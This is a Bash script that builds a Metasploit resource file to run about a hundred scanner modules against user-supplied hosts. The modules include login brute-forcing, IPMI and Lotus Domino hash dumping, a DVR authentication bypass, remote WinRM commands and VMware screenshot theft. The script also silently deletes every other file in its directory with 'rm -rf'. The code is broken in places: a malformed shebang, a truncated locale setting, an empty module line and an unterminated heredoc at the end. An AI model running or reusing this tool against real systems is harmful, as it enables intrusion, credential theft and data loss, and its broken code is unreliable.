#！ /bin/bash
LANG=zh_CN.UTF-
echo -e " 1.scanner :"
echo -e " 2.exit"
echo -e " Serial number > \c "
read etst1
     case $etst1 in
     1)
echo -e  "     "
echo -e  "RHOSTS > \c  "
        read RHOSTS
            echo -e  "     "
echo -e "  +------------++---------------------------------+"
echo -e "  | Name       ||     Show options "
echo -e "  +------------++---------------------------------+"
echo -e "  | RHOST      || 		$RHOSTS"
echo -e "  +------------++---------------------------------+"
echo -e "  "
echo -e "Do you start the payload handler? y or n: \c"
read handler
if [ "$handler" == "y" ]; then
	rm  -rf !(msf.sh|misc_sum.rc)
	if [[ ! -f "misc_sum.rc" ]]; then
	echo "use auxiliary/scanner/acpp/login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/backdoor/energizer_duo_detect" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/chargen/chargen_probe" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/couchdb/couchdb_enum" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/couchdb/couchdb_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dcerpc/endpoint_mapper" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dcerpc/hidden" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dcerpc/management" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dcerpc/windows_deployment_services" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dect/call_scanner" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dect/station_scanner" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/arp_sweep" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/empty_udp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/ipv6_multicast_ping" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/ipv6_neighbor" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/udp_probe" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/discovery/udp_sweep" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dlsw/dlsw_leak_capture" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/dns/dns_amp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/elasticsearch/indices_enum" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/emc/alphastor_devicemanager" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/emc/alphastor_librarymanager" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/etcd/open_key_scanner" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/etcd/version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/finger/finger_users" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/gopher/gopher_gophermap" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/h323/h323_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/ike/cisco_ike_benigncertain" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/imap/imap_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/ip/ipidseq" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/ipmi/ipmi_cipher_zero" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/ipmi/ipmi_dumphashes" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/ipmi/ipmi_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/kademlia/server_info" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/llmnr/query" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/lotus/lotus_domino_hashes" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/lotus/lotus_domino_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/lotus/lotus_domino_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/mdns/query" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/memcached/memcached_amp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/memcached/memcached_udp_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/cctv_dvr_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/cisco_smart_install" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/clamav_control" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/dahua_dvr_auth_bypass" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/dvr_config_disclosure" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/easycafe_server_fileaccess" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/ib_service_mgr_info" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/java_rmi_server" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/oki_scanner" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/poisonivy_control_scanner" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/raysharp_dvr_passwords" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/rosewill_rxs3211_passwords" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/sercomm_backdoor_scanner" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/sunrpc_portmapper" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/misc/zenworks_preboot_fileaccess" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/mongodb/mongodb_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/motorola/timbuktu_udp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/mqtt/connect" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/msf/msf_rpc_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/msf/msf_web_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/natpmp/natpmp_portscan" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nessus/nessus_ntp_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nessus/nessus_rest_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nessus/nessus_xmlrpc_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nessus/nessus_xmlrpc_ping" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/netbios/nbname" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nexpose/nexpose_api_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nfs/nfsmount" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/nntp/nntp_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/openvas/openvas_gsad_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/openvas/openvas_omp_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/openvas/openvas_otp_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/portmap/portmap_amp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
<<portscan
	echo "use auxiliary/scanner/portscan/ack" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/portscan/ftpbounce" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/portscan/syn" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/portscan/tcp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/portscan/xmas" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
portscan
	echo "use auxiliary/scanner/quake/server_info" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/rogue/rogue_recv" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/rogue/rogue_send" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/rservices/rexec_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/rservices/rlogin_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/rservices/rsh_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/rsync/modules_list" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/steam/server_info" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/telephony/wardial" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/teradata/teradata_odbc_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/udp/udp_amplification" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/upnp/ssdp_amp" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/upnp/ssdp_msearch" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/varnish/varnish_cli_file_read" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/varnish/varnish_cli_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/esx_fingerprint" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmauthd_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmauthd_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_enum_permissions" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_enum_sessions" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_enum_users" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_enum_vms" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_host_details" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_http_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_screenshot_stealer" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_server_dir_trav" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vmware/vmware_update_manager_traversal" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vnc/ard_root_pw" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vnc/vnc_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vnc/vnc_none_auth" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/voice/recorder" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vxworks/wdbrpc_bootline" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/vxworks/wdbrpc_version" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/winrm/winrm_auth_methods" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/winrm/winrm_cmd" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/winrm/winrm_login" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/winrm/winrm_wql" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/wproxy/att_open_proxy" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/wsdd/wsdd_query" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "use auxiliary/scanner/x11/open_x11" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
	echo "" >> misc_sum.rc
	echo "set RHOSTS $RHOSTS" >>misc_sum.rc
	echo "exploit" >>misc_sum.rc
	echo "back" >>misc_sum.rc
		#statements
	fi
<<portscan
use auxiliary/scanner/acpp/login
use auxiliary/scanner/backdoor/energizer_duo_detect
use auxiliary/scanner/chargen/chargen_probe
use auxiliary/scanner/couchdb/couchdb_enum
use auxiliary/scanner/couchdb/couchdb_login
use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
use auxiliary/scanner/dcerpc/windows_deployment_services
use auxiliary/scanner/dect/call_scanner
use auxiliary/scanner/dect/station_scanner
use auxiliary/scanner/discovery/arp_sweep
use auxiliary/scanner/discovery/empty_udp
use auxiliary/scanner/discovery/ipv6_multicast_ping
use auxiliary/scanner/discovery/ipv6_neighbor
use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/discovery/udp_sweep
use auxiliary/scanner/dlsw/dlsw_leak_capture
use auxiliary/scanner/dns/dns_amp
use auxiliary/scanner/elasticsearch/indices_enum
use auxiliary/scanner/emc/alphastor_devicemanager
use auxiliary/scanner/emc/alphastor_librarymanager
use auxiliary/scanner/etcd/open_key_scanner
use auxiliary/scanner/etcd/version
use auxiliary/scanner/finger/finger_users
use auxiliary/scanner/gopher/gopher_gophermap
use auxiliary/scanner/h323/h323_version
use auxiliary/scanner/ike/cisco_ike_benigncertain
use auxiliary/scanner/imap/imap_version
use auxiliary/scanner/ip/ipidseq
use auxiliary/scanner/ipmi/ipmi_cipher_zero
use auxiliary/scanner/ipmi/ipmi_dumphashes
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum
use auxiliary/scanner/kademlia/server_info
use auxiliary/scanner/llmnr/query
use auxiliary/scanner/lotus/lotus_domino_hashes
use auxiliary/scanner/lotus/lotus_domino_login
use auxiliary/scanner/lotus/lotus_domino_version
use auxiliary/scanner/mdns/query
use auxiliary/scanner/memcached/memcached_amp
use auxiliary/scanner/memcached/memcached_udp_version
use auxiliary/scanner/misc/cctv_dvr_login
use auxiliary/scanner/misc/cisco_smart_install
use auxiliary/scanner/misc/clamav_control
use auxiliary/scanner/misc/dahua_dvr_auth_bypass
use auxiliary/scanner/misc/dvr_config_disclosure
use auxiliary/scanner/misc/easycafe_server_fileaccess
use auxiliary/scanner/misc/ib_service_mgr_info
use auxiliary/scanner/misc/java_rmi_server
use auxiliary/scanner/misc/oki_scanner
use auxiliary/scanner/misc/poisonivy_control_scanner
use auxiliary/scanner/misc/raysharp_dvr_passwords
use auxiliary/scanner/misc/rosewill_rxs3211_passwords
use auxiliary/scanner/misc/sercomm_backdoor_scanner
use auxiliary/scanner/misc/sunrpc_portmapper
use auxiliary/scanner/misc/zenworks_preboot_fileaccess
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/scanner/motorola/timbuktu_udp
use auxiliary/scanner/mqtt/connect
use auxiliary/scanner/msf/msf_rpc_login
use auxiliary/scanner/msf/msf_web_login
use auxiliary/scanner/natpmp/natpmp_portscan
use auxiliary/scanner/nessus/nessus_ntp_login
use auxiliary/scanner/nessus/nessus_rest_login
use auxiliary/scanner/nessus/nessus_xmlrpc_login
use auxiliary/scanner/nessus/nessus_xmlrpc_ping
use auxiliary/scanner/netbios/nbname
use auxiliary/scanner/nexpose/nexpose_api_login
use auxiliary/scanner/nfs/nfsmount
use auxiliary/scanner/nntp/nntp_login
use auxiliary/scanner/openvas/openvas_gsad_login
use auxiliary/scanner/openvas/openvas_omp_login
use auxiliary/scanner/openvas/openvas_otp_login
use auxiliary/scanner/portmap/portmap_amp
use auxiliary/scanner/portscan/ack
